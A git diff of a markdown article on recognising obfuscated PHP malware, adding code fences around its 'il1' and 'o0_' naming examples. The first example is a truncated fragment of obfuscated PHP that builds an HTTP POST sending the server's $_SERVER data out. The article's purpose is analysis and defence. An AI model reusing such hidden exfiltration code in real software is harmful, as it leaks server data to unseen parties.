@@ -98,9 +98,12 @@ Some of the more common forms of plain obfuscated code that I've seen are `o0_` 
 
 #### Examples
 'il1' obfuscation tends to look similar to the below example, where most of the variables use the number 1, lowercase L, and upper or lower case I characters to deliberately confuse someone looking at the code and make it difficult to eyeball how the variables are being used.
+~~~~~~
     <?php if(!@$incode!=false||!@$incode!=null){$vl='s';$serverid='[hash]';$liillilllil=time();function lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill){if(ini_get('allow_url_fopen')==1):$lillillliiili=stream_context_create(array('http'=>array('method'=>'POST','header'=>array('Content-type: application/x-www-form-urlencoded'),'content'=>http_build_query($_SERVER))));if($lilillilllllill=='yes'):...
+~~~~~~
 
 'o0_' obfuscation is similar, but uses uppercase O, the number 0, and the underscore character (`_`) to achieve the same end goal.
+~~~~~~
     <?php
     //header('Content-Type:text/html; charset=utf-8');
     $O_OOO0__00='someval';
@@ -108,6 +111,7 @@ Some of the more common forms of plain obfuscated code that I've seen are `o0_` 
     $O_O0O_0_O0='thirdval';
     $O_O0O0_O0_='etc';
     ...
+~~~~~~
 
 ### Complex Obfuscation
 Complex obfuscation utilizes multiple techniques to make analyzing code more difficult. Most of the time, this is simply a combination of encryption and various encoding and compression techniques. Occasionally, I've come across obfuscation that does additional work, whether that's arithmetic, concatenation, or using substrings. As we run into these in the examples, I'll go into more detail on what the particular sample is doing.
